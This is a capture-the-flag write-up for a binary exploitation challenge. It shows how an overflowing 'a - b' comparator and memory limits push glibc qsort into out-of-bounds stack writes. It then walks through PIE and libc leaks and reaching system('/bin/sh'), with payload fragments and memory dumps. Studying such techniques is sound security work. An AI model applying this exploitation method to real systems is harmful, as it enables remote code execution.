# Desc

Welcome to our Resort! Although it's nothing fancy, we do allow you to resort as much as you would like. Are you going to play nice, or are you going to resort to trickery? In case every attempt fails, what is your last resort?

# Executable Description

The application let's us run a couple of settings,

* setting the application memory
* sorting longs, integers, shorts and chars, ascending or descending
* setting up a color for text

Also the binary comes with it's own LibC, which after searching corresponds to `libc6_2.35_amd64`

# Solution

## Exploit chain

The exploit chain for this application will be as follows:

* set `RLIMIT_AS` to a low value, forcing `qsort` to enter the `_quicksort` path
* use the `insertion phase` of `_quicksort` to perform `out of bounds writes`
* first we leak `compar4_dec` address
* afterwards we leak a `LibC` address using `printf`
* finally, we get `system(/bin/sh)` working

## Background and exploit explanation

It is important to state from the beginning that this challenge will be explained for `no ASLR` configurations. This exploit works with `ASLR` however under specific conditions that will be explained later in the write-up.

Looking into how the element sorting is happening, we can see the responsible function for this is the `sort_function`.
This function calls the `qsort` function, which takes as parameters

* the array where elements are stored
* the number of elements
* the size of an element
* a comparator

Looking further into the code, we can see 8 such comparators

* compar
* compar2
* compar3
* compar4
* compar_dec
* compar2_dec
* compar3_dec
* compar4_dec

Each of these comparators returns ` a - b ` as the result of the comparison

Example:

```
int compar3(int *param_1,int *param_2)

{
  return *param_1 - *param_2;
}
```

These function are put into an array, where based on the selected type of element (char, short, int,long) and the type of comparator they are called by `qsort`.

Now we have no basic overflows, each user input is limited to respect the boundaries of the application. However, we do have another issue.

For older versions of `glibc` (pre 2.39), the `qsort` algorithm would call `_quicksort` function for sorting elements under specific conditions. This function would first perform a `non-recursive quicksort`

Once that was done however, the `insertion sort` would trigger. The insertion sort part functions in the following way.

* The smallest element in the first threshold is found and set as the beginning of the array
* this would become the `base_ptr`
* `run_ptr` would run from right to left, comparing itself against `tmp_ptr` (the elements on it's left)
* `tmp_ptr` would decrement itself until it found `cmp(run_ptr,tmp_ptr) >=0`
* the first element (`base_ptr`) acting as a `barrier` for the array, not allowing `out of bounds access`

This can be seen here

```
 tmp_ptr = run_ptr - size;
 while ((*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) < 0)
   tmp_ptr -= size;
```

However this assumes that `cmp(run_ptr,base_ptr)` will always be `>0` which is not always true, due to the comparators
`non transitive comparision relation`.

To define what a `non transitive` comparison relation is, I think it's best to define first what a `transitive` one is.
For

```
a < b 
b < c 
then necessarly a < c 
```

However, looking at our `compar` functions, we can see that

```
int compar3(int a,int b){
return a-b;
}
```

This is `NOT` a transitive comparison relation, as, due to overflows, there are elements in which `a > c  BUT b > c , b > a  (false)`
For example:

```
a = 2 000 000 000 
b =-2 000 000 000
c = 1 000 000 000

( a > c > b ) -- TRUE 

(a - b) = 2 000 000 000 - (-2 000 000 000) = 2 000 000 000 + 2 000 000 000 = 4 000 000 000 (OVERFLOWS)
(a - b) = -294 967 296 
(a - b) < 0 ; a < b 

(b - c) = -2 000 000 000 - 1 000 000 000 = -3 000 000 000 (UNDERFLOWS)
(b - c) = 1 294 967 296 
(b - c) > 0; b > c

(a - c) = 2 000 000 000 - 1 000 000 000 = 1 000 000 000 (NO OVERFLOW)
(a - c) > 0; a > c 

HOWEVER

a < b ; b > c ; a > c so 
( b > a > c ) -- FALSE  
```

This can cause serious problems, as this function

```
 tmp_ptr = run_ptr - size;
 while ((*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) < 0)
   tmp_ptr -= size;
```

will keep searching and sorting elements until it has found `(*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) >= 0`. Once it has found that even the `base_ptr` doesn't satisfy the `cmp(run_ptr, base_ptr) >= 0` condition, it will start going `backwords in the stack` overwriting elements.

And this is the bug that we will exploit to get a `remote shell` of the machine. To do this however, two conditions have to be met, and that is:

```
/* It's somewhat large, so malloc it. */  
 int save = errno;  
 tmp = malloc (size);  
 __set_errno (save);  
 if (tmp == NULL)  
 {  
 /* Couldn't get space, so use the slower algorithm  
 that doesn't need a temporary array. */  
 _quicksort (b, n, s, cmp, arg);  
 return;  
 }
```

However. thanks to the `mem_reduce_function`, we can set up the `RLIMIT_AS` to a low value, limiting the `virtual memory` and failing the `malloc` call, allowing the `qsort` function to enter the `_quicksort` path.

and

```
  if (size < 1024)
    /* The temporary array is small, so put it on the stack.  */
    p.t = __alloca (size);
  else
```

which states that the array has to have at least `1024` bytes before the `_quicksort` path is chosen

The first step then is limiting the memory of the application, I have chosen `8096` as a value and that seems to have worked. Next I think it's best to examine the `sort_function` application layout

```
0x7fffffffd7c0: 0x0000555555556345 -- %hhd     
0x7fffffffd7c8: 0x000055555555634a -- %hd 
0x7fffffffd7d0: 0x000055555555604f -- %d      
0x7fffffffd7d8: 0x00005555555561a4 -- %ld 
0x7fffffffd7e0: 0x00005555555551e9 -- compar      
0x7fffffffd7e8: 0x0000555555555218 -- compar2 
0x7fffffffd7f0: 0x0000555555555247 -- compar3      
0x7fffffffd7f8: 0x000055555555526d -- compar4 
0x7fffffffd800: 0x00005555555552be -- compar_dec 
0x7fffffffd808: 0x00005555555552ed -- compar2_dec 
0x7fffffffd810: 0x000055555555531c -- compar3_dec      
0x7fffffffd818: 0x0000555555555342 -- compar4_dec 
```

with data from `0x7fffffffd820` till `0x7fffffffdc20` being user data

## PIE Leak

Checking the binary protections, we can see that

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
```

with our biggest obstacle at the moment being the `PIE enabled` , as we don't know any addresses.

We can sort this by carefully creating payloads. Two things we need to take into consideration

* values after overwriting and sorting tend to shift, which will be useful but something that needs to be kept in mind
* because of this, some functions might not be where they should and this could cause crashes in the program

As discussed previously, if `cmp` doesn't respect the `transitive properties` , then overwrites into the back of the array are possible. To do so however, we need to be careful when writing the elements. For this, I will use the following construct a lot in the exploit

```
number=0xFF
neg_number=negNumber(number,1)
payload=[number]*1+[neg_number]*1023
send_sort(bitType=b'1',ordered=True,count=b'1024',payload=payload)
```

where number is the number we want to insert. This time is `0xFF`. `negNumber` doesn't return the negative number, but the number necessary for `overflow` to happen. For example, for

```
For the number 0xFF

0x7f7f7f7f7f7f7fff

number = 0xFF
neg_number= 0x7F

7f7f7f7f7f7f7fff

7F = 127 
7F = - 1

FF - 7F = 127 -  (-1) = 127 + 1 = 128 = -128 < 0  
```

After the `0xFF` overwrite, we get the following state

```
0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0x005555555552ffed
0x7fffffffd810: 0x0055555555531c00      0x0055555555534200
0x7fffffffd820: 0x7f7f7f7f7f7f7f00      0x7f7f7f7f7f7f7f7f
```

As we can see, the `00` has been shifted in `818` and `810` and finally `ff` has been placed behind `ed`. This is because
`0xFF - 0xED >0` which stops the comparison and places the `0xFF`

The next step is to insert `0x0000f00000000000` using the same steps, as this will shift the `0x005555555555534200` into the `userdata` where it can be read

```

0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0x0000f00000000000
0x7fffffffd810: 0x005555555552ffed      0x0055555555531c00
0x7fffffffd820: 0x0055555555534200      0x8000f00000000000

```

This way, we can get the address of `compar4_dec`, which we can use to get the rest of the addresses for the binary.

## LIBC Leak

This is the time to mention that my way of doing this exploit, we need a specific `ASLR`, more specifically we need an `ASLR` address such that `compar4_dec` and `compar3_dec` have all bytes in their addresses smaller than `0x80` unsigned. Otherwise the byte-wise sorting behavior changes and the overwrite no longer lands as intended.

This is because the next step of the exploit is placing the `printf@plt` into the `compar4_dec` spot.

This is done to get a `LibC leak` . The method I use is `overwritting` `0xFF` repeatedly. As we saw before, for `no ASLR` the value has been placed right before the `0xED` in the `compar2_dec` function. However, this is true for all `ASLR` that have all bytes in `compar4_dec` and `compar3_dec` smaller than `0x80`. Checks have been added so in the case where `compar4_dec` and `compar3_dec` have any bytes larger than `0x80`, the script exits.

This is done also because otherwise, the `plt` addresses in general are at a lower value than the code

```
50e0 for the plt for getrlimit
51e4 for the smallest compare 
6345 for the %hhd symbol
```

Without doing this, the `printf@plt` would go to the `%hhd` symbol, and we wouldn't be able to do anything with it.

This is how the array looks after the `0xFF` overwrite.

```

0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0xffffffffffffffed
0x7fffffffd810: 0xffffffffffffffff      0x00005555555552ff
```

As we can see, the `printf@plt` address will be smaller than `52ff` address (`5080` for `printf`) HOWEVER,the `0xFFFFFFFFFFFFFFFF` will act as a barrier, meaning that `_quicksort` will not try to go any further behind and stop.

```
0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0xffffffffffffffed
0x7fffffffd810: 0xffffffffffffffff      0x0000555555555080
0x7fffffffd820: 0x00005555555552ff      0x8000555555555080
```

This I believe to be the other meaning of `Last Resort` as we do a last (re)sort until we get the values we want and also this was my last resort, brute forcing `ASLR` addresses.

Now that `printf` has been placed, we can get a `LibC leak`. To do so, we need to talk about another aspect, the `scanf`.

`__isoc99_scanf` is used throughout the program to read the user input. However, in one of the only places where input isn't checked well for errors, we can send chars such as `@` to rerun `qsort` with already given params. Why is this important? Because we use first send `%p` via the `short sort`, and then when running `long sort` ,we can make `printf` run with `%p%p%p%p`, reading values from the stack along with a `libc address` found at a specific offset.

Using this address, we can get the `LibC address`

## Getting a shell

The final step is getting a `shell`. `OneGadgets` haven't worked for me, as well as `execve`, `System` however does work, but with an important nuance. The virtual memory is `TOO LOW` as it currently stands at `8096`. Increasing it to a size where `system` works means that one of the conditions for `_quicksort` fails. So what can we do? Simple, we add both `mem_reduce_function` AND `system` as `compar3_dec` and `compar4_dec`. This can be done using a method similar to the one

This can be done using a similar method as the `printf@plt` write , but with different offsets.

For the first write, we write `8 bytes` in the first scenario

```
0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0xffffffffffffffed
0x7fffffffd810: 0x00005555555552ff      0x000055555555531c
```

We then shift `compar3_dec` and `compar4_dec` into a state where `libc.sym.system` and `elf.sym.mem_reduce_function` have a place. This is done by using `0xFFFFFFFF` but by using `integers` it shifts the address `4 bytes` to the left, creating the memory layout below

```
0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0xffffffffffffffed
0x7fffffffd810: 0x555552ffffffffff      0x5555531c00005555
```

Which is then overwritten with `mem_reduce_function` and `system`

```
0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
0x7fffffffd800: 0x00005555555552be      0xffffffffffffffed
0x7fffffffd810: 0x0000555555555547 (mem_reduce_function)     0x00007ffff7c50d70 (system)
```

After that is set, we can set the memory to `-1` which sets the memory to the `maximum available`, call `system` with the `/bin/sh` and `0` arguments and get a shell.

# Notes

A few notes I wanted to add here.

There are some places in which the exploit uses `sort_again` for parameter sending. This is because the `remote` (at least when I used it) was incredibly slow. As such, I wanted to eliminate as much of the waiting time as I could. And so I decided instead of sending all the data again, to only update small parts.

The way I got this to run, was using a simple script like so

```
for i in {1..200}; do
    echo "=== Run $i ==="
    python3 mypwn.py
    echo "=== Run $i finished ==="
    sleep 1
done
```

to not have to rerun the script manually. After 15-25 tries or around an hour I got a good `ASLR`, so it will take a bit of time. This is again mostly due to the `remote`.

Improvements could be made, as I am not sure if the `0xFF` is the best way to write the address, also the `GOT` being writable presents some opportunities for fun.  
